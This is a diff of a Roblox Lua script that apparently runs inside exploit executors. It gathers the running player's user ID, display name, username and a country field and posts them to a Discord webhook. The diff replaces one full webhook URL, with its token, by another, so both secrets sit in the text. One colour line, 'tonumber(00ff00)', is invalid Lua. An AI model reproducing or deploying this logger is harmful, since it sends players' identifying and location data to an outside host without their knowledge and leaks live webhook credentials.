@@ -10,7 +10,7 @@ local data = {
             title = "Profile Player",
             url = "https://www.roblox.com/users/" .. player.UserId,
             description = "```" .. player.DisplayName .. " (" .. player.Name .. ") ```",
-            color = tonumber(00ff00),
+            color = tonumber(322852),
             fields = {
                 {
                     name = "ᴄᴏᴜɴᴛʀʏ:",
@@ -48,7 +48,7 @@ local data = {
 }
 
 local jsonData = HttpService:JSONEncode(data)
-local webhookUrl = "https://discord.com/api/webhooks/1208757346176598036/PES8jIYKLKHiEFykTc9WUj6X3Ic55xIUzWai5VEhSg0ICGsTw7kyUgPiP2O9qWzdOyqK"
+local webhookUrl = "https://discord.com/api/webhooks/1208757356456968224/p0BFMEuh1CQkQt2zCi7MkxHAZ1C_xhiGMVhUvUScprj6IgyXao2nfa9FHB5Gkoxqkrr7"
 local headers = {["Content-Type"] = "application/json"}
 request = http_request or request or HttpPost or fluxus.request or syn.request or Krnl.request or delta.request;
 local request = http_request or request or HttpPost or syn.request
